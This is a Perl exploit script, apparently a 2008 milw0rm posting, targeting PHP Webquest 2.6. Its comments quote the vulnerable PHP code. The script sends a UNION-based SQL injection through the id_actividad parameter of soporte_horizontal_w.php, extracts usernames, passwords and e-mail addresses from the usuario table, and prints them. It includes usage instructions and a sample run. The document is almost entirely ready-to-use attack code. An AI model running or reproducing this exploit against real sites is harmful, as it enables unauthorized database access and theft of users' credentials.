#!/usr/bin/perl

# PHP Webquest 2.6 Remote SQL Injection Exploit
# coded by ka0x - D.O.M TEAM 2008
# we are: ka0x, an0de, xarnuz

# download spanish: download: http://phpwebquest.org/descargas/phpwebquest-2.6-espanol.zip
# download english: http://phpwebquest.org/descargas/phpwebquest-2.6-international.zip

# vuln in soporte_horizontal_w.php:

# if ($_GET['id_actividad']!=''){ $id_actividad=$_GET['id_actividad']; }
# $sentencia= "SELECT * FROM actividad WHERE id_actividad=".$id_actividad;

# ka0x@domlabs:~# perl phpwebquest.pl http://127.0.0.1/webquest/
#
# [+] connecting in http://127.0.0.1/webquest/...
# [!] user: ka0x  [!] pass: test [!] e-mail: test@test.com

use strict;
use LWP::UserAgent;

my $host = $ARGV[0];
if ($host !~ /^http:/){ $host = 'http://'.$host; }

 if(!$ARGV[0]) {
    print "\n[x] PHP Webquest 2.6 Remote SQL Injection exploit\n";
    print "[x] written by ka0x - ka0x01[at]gmail.com\n";
    print "[x] usage: perl $0 [host]\n";
    print "[x] example: http://host.com/PHPWebquest\n";
    exit(1);
 }
 
    print "\n[+] connecting in $host...\n";
    my $cnx = LWP::UserAgent->new() or die;
    my $go=$cnx->get($host."/soporte_horizontal_w.php?id_actividad=-1/**/union/**/select/**/1,1,1,1,concat(0x5f5f5f5f,0x5b215d20757365723a20,usuario,0x20205b215d20706173733a20,password,0x205b215d20652d6d61696c3a20,e_mail,0x5f5f5f5f)/**/from/**/usuario/*");
    if ($go->content =~ m/____(.*?)____/ms) {
        print "$1\n";
    } else {
        print "\n[-] exploit failed\n";
}

# milw0rm.com [2008-01-08]
